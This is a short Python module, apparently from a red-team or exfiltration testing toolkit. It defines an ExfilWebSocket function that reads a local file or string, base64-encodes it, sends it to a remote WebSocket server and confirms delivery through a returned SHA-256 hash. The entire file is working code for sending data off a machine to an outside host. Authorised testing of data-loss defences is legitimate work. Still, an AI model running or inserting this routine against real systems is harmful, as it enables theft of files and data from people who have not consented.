import asyncio
import websockets
import base64
import os
import hashlib
import json
import logging

async def ExfilWebSocket(uri, data, File=False):
    logging.debug("Using WebSocket exfiltration")
    if not File:
        if isinstance(data, list):
            logging.debug("data is a list, converting to string")
            data = ','.join(data)
            data = data.encode('utf-8')
        else:
            logging.debug("data is a string")
            data = data.encode('utf-8')
    else:
        logging.debug("data is a file")
        if data == "":
            logging.error("No file")
            return False
        else:
            if not os.path.isfile(data):
                logging.error("Bad filepath")
                return False
            else:
                logging.debug("Reading file")
                data = open(data, "rb").read()

    data_b64 = base64.b64encode(data).decode('utf-8')

    async with websockets.connect(uri) as websocket:
        logging.debug("Sending data to WebSocket server")

        # Send the data
        await websocket.send(data_b64)
        logging.debug("Waiting for response from WebSocket server")

        # Receive the hash of the data from the server
        response = await websocket.recv()
        logging.debug("Got response from websocket server")

        # Calculate the hash of the original data
        hash_object = hashlib.sha256(data_b64.encode())
        original_hash = hash_object.hexdigest()

        # Check if the received hash matches the original hash
        if response == original_hash:
            logging.debug("Data exfiltration successful!")
            return True
        else:
            logging.error("Data exfiltration failed, hashes do not match!")
            return False

